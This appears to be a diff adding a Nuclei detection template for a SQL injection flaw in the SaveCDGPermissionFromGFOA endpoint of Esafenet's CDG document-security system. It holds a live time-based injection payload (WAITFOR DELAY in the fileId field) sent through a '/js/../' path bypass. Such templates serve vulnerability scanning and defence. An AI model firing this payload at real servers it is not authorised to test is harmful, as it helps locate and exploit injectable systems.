@@ -1,0 +1,48 @@
+id: yisaitong-esafenet-savecdgpermissionfromgfoa-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 SaveCDGPermissionFromGFOA SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(2,5)}}'
+  t2: '{{to_number(t1) + to_number(t1)}}'
+  t3: '{{to_number(t2) + 2}}'
+  t4: '{{url_encode("电子文档安全管理系统")}}'
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t4}}'
+        part: body
+
+  - raw:
+      - |
+        POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fileId=1';WAITFOR DELAY '0:0:{{t1}}'--&pis=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - duration > t2
+          - duration < t3
